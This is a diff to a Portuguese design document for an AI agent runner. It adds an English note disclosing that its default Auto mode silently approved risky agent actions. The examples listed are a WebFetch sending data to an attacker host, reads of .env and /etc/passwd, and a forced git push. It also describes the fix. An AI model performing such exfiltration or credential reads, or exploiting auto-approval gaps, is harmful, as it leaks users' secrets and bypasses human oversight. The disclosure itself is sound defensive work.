@@ -1794,6 +1794,17 @@ A política passa a ter a mesma escala do outro motor, e a **cerca vem antes do 
 
 Nada disso **bloqueia**: o que sai do automático vira **cartão**, e quem decide é o dev.
 
+> **23/09/2026 — in the default mode this boundary was off until 1.6.12.** Every card the runner
+> emitted was `policy: "confirm"`, and the page's Auto mode (the default) approves by itself any
+> `confirm` card it judges "inside the project". Measured with the page's own functions:
+> `WebFetch https://attacker/?d=…`, `Read .env`, `Read /etc/passwd` and `git push --force` were
+> all auto-approved — the cards existed and nobody decided them. The tests checked that a card
+> is emitted, not what happens to it. From 1.6.12 the three classes above (network egress,
+> protected path, destructive) go out as `always`, which the page never auto-approves and never
+> offers "Sempre" for; a read outside the project stays `confirm`, with its path visible to the
+> page's check. ⚠️ The page side (SHVIA-WEB) still auto-approves any `confirm` card it misjudges
+> as inside — for the `anna` engine too — and is not changed here.
+
 ### Consequência de desenho: a política virou módulo
 
 `claude-runner.mjs` roda ao ser importado, então nada dentro dele era testável — a única prova
